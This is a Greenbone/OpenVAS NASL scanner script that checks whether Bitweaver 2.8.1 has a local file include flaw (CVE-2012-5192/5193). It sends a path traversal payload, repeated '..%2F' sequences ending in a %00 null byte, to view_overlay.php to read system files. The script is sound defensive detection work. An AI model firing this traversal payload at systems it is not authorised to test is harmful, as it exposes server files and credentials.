# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:bitweaver:bitweaver";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103593");
  script_cve_id("CVE-2012-5192", "CVE-2012-5193");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("2025-04-15T05:54:49+0000");

  script_name("Bitweaver Multiple Cross Site Scripting and Local File Include Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56230");

  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-11-15 21:14:00 +0000 (Fri, 15 Nov 2019)");
  script_tag(name:"creation_date", value:"2012-10-26 10:50:00 +0200 (Fri, 26 Oct 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("secpod_bitweaver_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Bitweaver/installed");

  script_tag(name:"summary", value:"Bitweaver is prone to multiple cross-site scripting vulnerabilities
  and a local file include vulnerability.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication
  credentials, and open or run arbitrary files in the context of the web server process.");

  script_tag(name:"affected", value:"Bitweaver 2.8.1 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

files = traversal_files();

foreach file (keys(files)) {

  url = dir  + '/gmap/view_overlay.php?overlay_type=' + crap(data:"..%2F", length:15*5) + '/' + files[file] + '%00';

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
